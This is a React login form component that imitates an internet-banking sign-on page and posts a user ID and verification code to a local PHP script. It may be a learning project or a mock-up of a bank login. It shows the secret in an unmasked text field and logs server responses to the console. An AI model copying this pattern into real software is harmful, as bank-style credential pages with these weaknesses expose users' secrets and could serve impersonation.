import React, { useState } from 'react'
import axios from 'axios'
import { useNavigate } from 'react-router-dom'

export default function Form() {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [verify, setVerify] = useState('')

  const navigate = useNavigate()

  const handleSubmit = async (e) => {
    e.preventDefault()
    try {
      const res = await axios.post('http://localhost/macdon/login.php', {
        username,
        password,
        verify,
      })
      console.log('Response:', res)
      if (res.data.status === 'success') {
        navigate('/dashboard')
      } else {
        console.error('Login failed:', res.data.message)
        alert(res.data.message)
      }
    } catch (error) {
      console.error('Login error:', error)
    }
  }
  return (
    <div>
      <form
        onSubmit={handleSubmit}
        target='_blank'
        className='form p-3 px-8  rounded-xl flex flex-col gap-4'
      >
        <div className='leading-4'>
          <h3>Log on to Internet Banking</h3>
          <label htmlFor='username'>
            User ID<span className='text-red-600'>*</span>
          </label>
          <input
            type='text'
            id='username'
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <p>For corporate customers, kindly use Corporate ID.User ID</p>
        </div>
        <div className='-m-2'>
          <label htmlFor='verify'>
            Verification<span className='text-red-600'>*</span>
          </label>
          <div className='flex flex-col gap-4'>
            <input
              type='text'
              id='password'
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder='4456'
              className='font-bold'
            />
            <input
              type='text'
              value={verify}
              onChange={(e) => setVerify(e.target.value)}
              placeholder='Confirm Verification'
            />
          </div>
        </div>
        <button
          type='submit'
          className='next-btn cursor-pointer bg-[#e0ad0f] max-w-26 px-8 font-semibold p-1 text-[15px] rounded-lg'
        >
          Next
        </button>
        {/* <div className='divider'></div> */}
        <p>New customer ?</p>
        <button className='registerbtn cursor-pointer'>Self-Registration</button>
      </form>
    </div>
  )
}
